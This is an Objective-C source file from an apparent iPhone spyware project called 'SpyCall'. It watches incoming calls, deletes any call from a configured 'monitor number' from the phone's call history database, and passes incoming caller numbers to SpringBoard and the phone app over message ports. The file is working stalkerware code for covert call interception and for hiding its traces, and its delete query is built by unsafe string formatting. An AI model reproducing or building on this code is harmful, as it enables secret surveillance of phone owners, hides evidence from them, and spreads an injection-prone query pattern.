//
//  RecentCallNotifier.m
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RecentCallNotifier.h"
#import "TelephonyNotificationManagerImpl.h"
#import "MessagePortIPCSender.h"

#import "PreferenceManager.h"
#import "Preference.h"
#import "PrefMonitorNumber.h"

#import "DefStd.h"
#import "FMDatabase.h"
//#import "CTCall.h"
#import "Telephony.h"
#import "TelephoneNumber.h"


@interface RecentCallNotifier (private)

- (void) startNotification;
- (void) stopNotifcation;
- (void) main;

- (void) recentCallAdded: (id) aNotification;
- (void) callStatusChanged: (id) aNotification;

- (void) deleteCallFromCallDatabase: (CTCall *) aCall;
- (NSString *) telephoneNumber: (CTCall *) aCall;
- (BOOL) isSpyNumber: (NSString *) aTelephoneNumber;

@end

@implementation RecentCallNotifier

@synthesize mPreferenceManager;
@synthesize mIsListening;

- (id) init {
	if ((self = [super init])) {
		
	}
	return (self);
}

- (void) start {
	if (![self mIsListening]) {
		[self startNotification];
		[self setMIsListening:YES];
	}
}

- (void) stop {
	if ([self mIsListening]) {
		[self stopNotifcation];
		[self setMIsListening:NO];
	}
}

- (BOOL) isSpyCall: (CTCall *) aCall {
	return ([self isSpyNumber:[self telephoneNumber:aCall]] && !CTCallIsOutgoing(aCall));
}

- (void) startNotification {
	mRecentCallNotificationThread = [[NSThread alloc] initWithTarget:self selector:@selector(main) object:nil];
	[mRecentCallNotificationThread start];
}

- (void) stopNotifcation {
	[mRecentCallNotificationThread cancel];
	if (mRecentCallNotificationRL) {
		CFRunLoopRef rl = [mRecentCallNotificationRL getCFRunLoop];
		CFRunLoopStop(rl);
		mRecentCallNotificationRL = nil;
	}
	[mRecentCallNotificationThread release];
	mRecentCallNotificationThread = nil;
}

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	RecentCallNotifier *this = self;
	[this retain];
	mRecentCallNotificationRL = [NSRunLoop currentRunLoop];
	DLog (@"Telephone number helper thread, is main thread = %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
	@try {
		TelephonyNotificationManagerImpl* telephonyImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[telephonyImpl startListeningToTelephonyNotifications];
		[telephonyImpl addNotificationListener:self withSelector:@selector(recentCallAdded:)
							   forNotification:KCALLHISTORYRECORDADDNOTIFICATION];
		[telephonyImpl addNotificationListener:self withSelector:@selector(callStatusChanged:)
							   forNotification:KCALLSTATUSCHANGENOTIFICATION];
		while (![[NSThread currentThread] isCancelled]) {
			DLog (@"While loop enter ....");
			// Create run loop source
			NSTimer *t = [NSTimer scheduledTimerWithTimeInterval:3600
														  target:nil
														selector:nil
														userInfo:nil
														 repeats:NO];
			CFRunLoopRunInMode(kCFRunLoopDefaultMode, 3600, YES);
			t = nil;
			DLog (@"While loop exit ....");
		};
		[telephonyImpl removeListner:self withName:KCALLSTATUSCHANGENOTIFICATION];
		[telephonyImpl removeListner:self withName:KCALLHISTORYRECORDADDNOTIFICATION];
		[telephonyImpl stopListeningToTelephonyNotifications];
		[telephonyImpl release];
		telephonyImpl = nil;
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[this release];
	[pool release];
	DLog(@"======== PICKER THREAD EXIT ========");
}

- (void) recentCallAdded: (id) aNotification {
	DLog(@"recentCallAdded >>>>>>, is main thread: %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
	NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	CTCall *call = (CTCall *)[userInfo objectForKey:@"kCTCall"];
	if ([self isSpyCall:call]) {
		[self deleteCallFromCallDatabase:call];
	}
}

- (void) callStatusChanged: (id) aNotification {
	DLog(@"callStatusChanged >>>>>>, is main thread: %@, %d", [NSThread currentThread], [[NSThread currentThread] isMainThread]);
	NSNotification *notification = aNotification;
	NSDictionary *userInfo = [notification userInfo];
	NSInteger status = [[userInfo objectForKey:@"kCTCallStatus"] intValue];
	if (status == CALL_NOTIFICATION_STATUS_INCOMING) {
		CTCall *call = (CTCall *)[userInfo objectForKey:@"kCTCall"];
		NSString *telephoneNumber = [self telephoneNumber:call];
		
		// SpringBoard
		MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort1];
		[sender writeDataToPort:[telephoneNumber dataUsingEncoding:NSUTF8StringEncoding]];
		[sender release];
		sender = nil;
		
		// Mobile phone
		sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallPhoneNumberPickerMsgPort2];
		[sender writeDataToPort:[telephoneNumber dataUsingEncoding:NSUTF8StringEncoding]];
		[sender release];
	}
}

- (void) deleteCallFromCallDatabase: (CTCall *) aCall {
	FMDatabase *callDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
	[callDatabase open];
	[callDatabase executeUpdate:[NSString stringWithFormat:@"DELETE FROM call WHERE address = '%@'", [self telephoneNumber:aCall]]];
	DLog(@"Call database last error code = %d, message = %@", [callDatabase lastErrorCode], [callDatabase lastErrorMessage])
	[callDatabase close];
}

- (NSString *) telephoneNumber: (CTCall *) aCall {
	NSString *telephoneNumber = CTCallCopyAddress(nil, aCall);
	[telephoneNumber autorelease];
	return (telephoneNumber);
}

- (BOOL) isSpyNumber: (NSString *) aTelephoneNumber {
	DLog(@"isSpyNumber %@ >>>>>>", aTelephoneNumber);
	BOOL yes = NO;
	PrefMonitorNumber *prefMonitorNumbers = (PrefMonitorNumber *)[[self mPreferenceManager] preference:kMonitor_Number];
	if ([prefMonitorNumbers mEnableMonitor]) {
		TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
		for (NSString *monitorNumber in [prefMonitorNumbers mMonitorNumbers]) {
			if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:monitorNumber]) {
				yes = YES;
				break;
			}
		}
		[telNumber release];
	}
	return (yes);
}
- (void) dealloc {
	[self stop];
	[super dealloc];
}

@end
